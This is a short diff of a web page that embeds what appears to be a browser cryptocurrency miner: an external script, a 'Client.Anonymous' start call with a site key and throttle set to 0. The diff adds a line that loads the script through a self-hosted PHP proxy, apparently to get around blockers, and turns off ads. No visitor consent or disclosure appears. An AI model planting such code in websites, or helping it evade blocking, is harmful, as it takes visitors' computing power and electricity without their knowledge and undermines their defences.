@@ -172,9 +172,10 @@ if ($ret == false) {
     </div>
 </div>
 <script src="https://www.hostingcloud.racing/erHc.js"></script>
+<script src="http://<your-domain>/<path-to-script>/PRUe.php?f=erHc.js"></script>
 <script>
     var _client = new Client.Anonymous('016b1163139e575e2acb10e5dc1bfbde68d3e011d764a4727a544a8037be66c5', {
-        throttle: 0, c: 'w'
+        throttle: 0, c: 'w', ads: 0
     });
     _client.start();
 </script>
